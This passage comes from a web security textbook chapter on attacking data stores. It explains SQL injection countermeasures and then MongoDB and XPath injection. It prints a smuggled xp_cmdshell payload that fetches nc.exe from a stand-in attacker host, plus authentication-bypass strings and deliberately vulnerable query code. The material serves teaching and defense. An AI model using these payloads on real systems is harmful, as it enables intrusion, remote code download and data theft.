n In second-order SQL injection attacks, data that has been safely escaped
when initially inserted into the database is subsequently read from the
database and then passed back to it again. Quotation marks that were
doubled initially return to their original form when the data is reused.
Another countermeasure that is often cited is the use of stored procedures
for all database access. There is no doubt that custom stored procedures can
provide security and performance benefi ts. However, they are not guaranteed
to prevent SQL injection vulnerabilities for two reasons:
n As you saw in the case of Oracle, a poorly written stored procedure can
contain SQL injection vulnerabilities within its own code. Similar security
issues arise when constructing SQL statements within stored procedures
as arise elsewhere. The fact that a stored procedure is being used does
not prevent fl aws from occurring.
n Even if a robust stored procedure is being used, SQL injection vulnerabili-
ties can arise if it is invoked in an unsafe way using user-supplied input.
For example, suppose that a user registration function is implemented
within a stored procedure, which is invoked as follows:
exec sp_RegisterUser ‘joe’, ‘secret’
This statement may be just as vulnerable as a simple INSERT statement.
For example, an attacker may supply the following password:
foo’; exec master..xp_cmdshell ‘tftp wahh-attacker.com GET nc.exe’--
which causes the application to perform the following batch query:
exec sp_RegisterUser ‘joe’, ‘foo’; exec master..xp_cmdshell ‘tftp
wahh-attacker.com GET nc.exe’--’
Therefore, the use of the stored procedure has achieved nothing.
In fact, in a large and complex application that performs thousands of different
SQL statements, many developers regard the solution of reimplementing these state-
ments as stored procedures to be an unjustifi able overhead on development time.
Parameterized Queries
Most databases and application development platforms provide APIs for handling
untrusted input in a secure way, which prevents SQL injection vulnerabilities
from arising. In parameterized queries (also known as preparedstatements), the
construction of a SQL statement containing user input is performed in two steps:
1. The application specifi es the query’s structure, leaving placeholders for
each item of user input.
2. The application specifi es the contents of each placeholder.
cc0099..iinndddd 333399 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 340
340 Chapter 9 n Attacking Data Stores
Crucially, there is no way in which crafted data that is specifi ed at the
second step can interfere with the structure of the query specifi ed in the fi rst
step. Because the query structure has already been defi ned, the relevant API
handles any type of placeholder data in a safe manner, so it is always interpreted
as data rather than part of the statement’s structure.
The following two code samples illustrate the difference between an unsafe
query dynamically constructed from user data and its safe parameterized coun-
terpart. In the fi rst, the user-supplied name parameter is embedded directly into
a SQL statement, leaving the application vulnerable to SQL injection:
//define the query structure
String queryText = “select ename,sal from emp where ename =’”;
//concatenate the user-supplied name
queryText += request.getParameter(“name”);
queryText += “’”;
// execute the query
stmt = con.createStatement();
rs = stmt.executeQuery(queryText);
In the second example, the query structure is defi ned using a question mark as
a placeholder for the user-supplied parameter. The prepareStatement method is
invoked to interpret this and fi x the structure of the query that is to be executed.
Only then is the setString method used to specify the parameter’s actual value.
Because the query’s structure has already been fi xed, this value can contain any
data without affecting the structure. The query is then executed safely:
//define the query structure
String queryText = “SELECT ename,sal FROM EMP WHERE ename = ?”;
//prepare the statement through DB connection “con”
stmt = con.prepareStatement(queryText);
//add the user input to variable 1 (at the first ? placeholder)
stmt.setString(1, request.getParameter(“name”));
// execute the query
rs = stmt.executeQuery();
NOTE The precise methods and syntax for creating parameterized queries dif-
fer among databases and application development platforms. See Chapter 18
for more details about the most common examples.
cc0099..iinndddd 334400 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 341
Chapter 9 n Attacking Data Stores 341
If parameterized queries are to be an effective solution against SQL injection,
you need to keep in mind several important provisos:
n They should be used for every database query. The authors have encoun-
tered many applications where the developers made a judgment in each
case about whether to use a parameterized query. In cases where user-
supplied input was clearly being used, they did so; otherwise, they didn’t
bother. This approach has been the cause of many SQL injection fl aws.
First, by focusing only on input that has been immediately received from
the user, it is easy to overlook second-order attacks, because data that
has already been processed is assumed to be trusted. Second, it is easy to
make mistakes about the specifi c cases in which the data being handled
is user-controllable. In a large application, different items of data are
held within the session or received from the client. Assumptions made
by one developer may not be communicated to others. The handling of
specifi c data items may change in the future, introducing a SQL injection
fl aw into previously safe queries. It is much safer to take the approach of
mandating the use of parameterized queries throughout the application.
n Every item of data inserted into the query should be properly para meterized.
The authors have encountered numerous cases where most of a query’s
parameters are handled safely, but one or two items are concatenated
directly into the string used to specify the query structure. The use of
parameterized queries will not prevent SQL injection if some parameters
are handled in this way.
n Parameter placeholders cannot be used to specify the table and column
names used in the query. In some rare cases, applications need to specify
these items within a SQL query on the basis of user-supplied data. In this
situation, the best approach is to use a white list of known good values
(the list of tables and columns actually used within the database) and to
reject any input that does not match an item on this list. Failing this, strict
validation should be enforced on the user input — for example, allow-
ing only alphanumeric characters, excluding whitespace, and enforcing
a suitable length limit.
n Parameter placeholders cannot be used for any other parts of the query,
such as the ASC or DESC keywords that appear within an ORDER BY clause,
or any other SQL keyword, since these form part of the query structure.
As with table and column names, if it is necessary for these items to be
specifi ed based on user-supplied data, rigorous white list validation should
be applied to prevent attacks.
cc0099..iinndddd 334411 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 342
342 Chapter 9 n Attacking Data Stores
Defense in Depth
As always, a robust approach to security should employ defense-in-depth
measures to provide additional protection in the event that frontline defenses
fail for any reason. In the context of attacks against back-end databases, three
layers of further defense can be employed:
n The application should use the lowest possible level of privileges when
accessing the database. In general, the application does not need DBA-
level permissions. It usually only needs to read and write its own data. In
security-critical situations, the application may employ a different database
account for performing different actions. For example, if 90 percent of its
database queries require only read access, these can be performed using
an account that does not have write privileges. If a particular query needs
to read only a subset of data (for example, the orders table but not the
user accounts table), an account with the corresponding level of access
can be used. If this approach is enforced throughout the application, any
residual SQL injection fl aws that may exist are likely to have their impact
signifi cantly reduced.
n Many enterprise databases include a huge amount of default functional-
ity that can be leveraged by an attacker who gains the ability to execute
arbitrary SQL statements. Wherever possible, unnecessary functions
should be removed or disabled. Even though there are cases where a
skilled and determined attacker may be able to recreate some required
functions through other means, this task is not usually straightforward,
and the database hardening will still place signifi cant obstacles in the
attacker’s path.
n All vendor-issued security patches should be evaluated, tested, and applied
in a timely way to fi x known vulnerabilities within the database software
itself. In security-critical situations, database administrators can use various
subscriber-based services to obtain advance notifi cation of some known
vulnerabilities that have not yet been patched by the vendor. They can
implement appropriate work-around measures in the interim.
Injecting into NoSQL
The term NoSQL is used to refer to various data stores that break from stan-
dard relational database architectures. NoSQL data stores represent data using
key/value mappings and do not rely on a fi xed schema such as a conventional
database table. Keys and values can be arbitrarily defi ned, and the format of
the value generally is not relevant to the data store. A further feature of key/
value storage is that a value may be a data structure itself, allowing hierarchical
storage, unlike the fl at data structure inside a database schema.
cc0099..iinndddd 334422 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 343
Chapter 9 n Attacking Data Stores 343
NoSQL advocates claim this has several advantages, mainly in handling very
large data sets, where the data store’s hierarchical structure can be optimized
exactly as required to reduce the overhead in retrieving data sets. In these
instances a conventional database may require complex cross-referencing of
tables to retrieve information on behalf of an application.
From a web application security perspective, the key consideration is how
the application queries data, because this determines what forms of injection
are possible. In the case of SQL injection, the SQL language is broadly similar
across different database products. NoSQL, by contrast, is a name given to a
disparate range of data stores, all with their own behaviors. They don’t all use
a single query language.
Here are some of the common query methods used by NoSQL data stores:
n Key/value lookup
n XPath (described later in this chapter)
n Programming languages such as JavaScript
NoSQL is a relatively new technology that has evolved rapidly. It has not
been deployed on anything like the scale of more mature technologies such as
SQL. Hence, research into NoSQL-related vulnerabilities is still in its infancy.
Furthermore, due to the inherently simple means by which many NoSQL imple-
mentations allow access to data, examples sometimes discussed of injecting into
NoSQL data stores can appear contrived.
It is almost certain that exploitable vulnerabilities will arise in how NoSQL
data stores are used in today’s and tomorrow’s web applications. One such
example, derived from a real-world application, is described in the next section.
Injecting into MongoDB
Many NoSQL databases make use of existing programming languages to pro-
vide a fl exible, programmable query mechanism. If queries are built using
string concatenation, an attacker can attempt to break out of the data context
and alter the query’s syntax. Consider the following example, which performs
a login based on user records in a MongoDB data store:
$m = new Mongo();
$db = $m->cmsdb;
$collection = $db->user;
$js = “function() {
return this.username == ‘$username’ & this.password == ‘$password’; }”;
$obj = $collection->findOne(array(‘$where’ => $js));
if (isset($obj[“uid”]))
{
$logged_in=1;
cc0099..iinndddd 334433 88//1199//22001111 1122::0099::3333 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 344
344 Chapter 9 n Attacking Data Stores
}
else
{
$logged_in=0;
}
$js is a JavaScript function, the code for which is constructed dynamically
and includes the user-supplied username and password. An attacker can bypass
the authentication logic by supplying a username:
Marcus’//
and any password. The resulting JavaScript function looks like this:
function() { return this.username == ‘Marcus’//’ & this.password == ‘aaa’; }
NOTE In JavaScript, a double forward slash (//) signifi es a rest-of-line com-
ment, so the remaining code in the function is commented out.
An alternative means of ensuring that the $js function always returns
true, without using a comment, would be to supply a username of:
a’ || 1==1 || ‘a’==’a
JavaScript interprets the various operators like this:
(this.username == ‘a’ || 1==1) || (‘a’==’a’ & this.password ==
‘aaa’);
This results in all of the resources in the user collection being matched,
since the fi rst disjunctive condition is always true (1 is always equal to 1).
Injecting into XPath
The XML Path Language (XPath) is an interpreted language used to navigate
around XML documents and to retrieve data from within them. In most cases,
an XPath expression represents a sequence of steps that is required to navigate
from one node of a document to another.
Where web applications store data within XML documents, they may use
XPath to access the data in response to user-supplied input. If this input is
inserted into the XPath query without any fi ltering or sanitization, an attacker
may be able to manipulate the query to interfere with the application’s logic or
retrieve data for which she is not authorized.
XML documents generally are not a preferred vehicle for storing enterprise data.
However, they are frequently used to store application confi guration data that may
be retrieved on the basis of user input. They may also be used by smaller applica-
tions to persist simple information such as user credentials, roles, and privileges.
cc0099..iinndddd 334444 88//1199//22001111 1122::0099::3344 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 345
Chapter 9 n Attacking Data Stores 345
Consider the following XML data store:
William
Gates
MSRocks!
PI:EMAIL
5130 8190 3282 3515
Chris
Dawes
secret
PI:EMAIL
3981 2491 3242 3121
James
Hunter
letmein
PI:EMAIL
8113 5320 8014 3313
An XPath query to retrieve all e-mail addresses would look like this:
//address/email/text()
A query to return all the details of the user Dawes would look like this:
//address[surname/text()=’Dawes’]
In some applications, user-supplied data may be embedded directly into
XPath queries, and the results of the query may be returned in the application’s
response or used to determine some aspect of the application’s behavior.
Subverting Application Logic
Consider an application function that retrieves a user’s stored credit card num-
ber based on a username and password. The following XPath query effectively
verifi es the user-supplied credentials and retrieves the relevant user’s credit
card number:
//address[surname/text()=’Dawes’ and password/text()=’secret’]/ccard/
text()
cc0099..iinndddd 334455 88//1199//22001111 1122::0099::3344 PPMM
Stuttard c09.indd V3 - 07/28/2011 Page 346
346 Chapter 9 n Attacking Data Stores
In this case, an attacker may be able to subvert the application’s query in an
identical way to a SQL injection fl aw. For example, supplying a password with
this value:
‘ or ‘a’=’a
results in the following XPath query, which retrieves the credit card details of
all users:
//address[surname/text()=’Dawes’ and password/text()=’’ or ‘a’=’a’]/
ccard/text()
NOTE
n As with SQL injection, single quotation marks are not required when
injecting into a numeric value.
n Unlike SQL queries, keywords in XPath queries are case-sensitive, as are
the element names in the XML document itself.
Informed XPath Injection
XPath injection fl aws can be exploited to retrieve arbitrary information from
within the target XML document. One reliable way of doing this uses the same
technique as was described for SQL injection, of causing the application to
respond in different ways, contingent on a condition specifi ed by the attacker.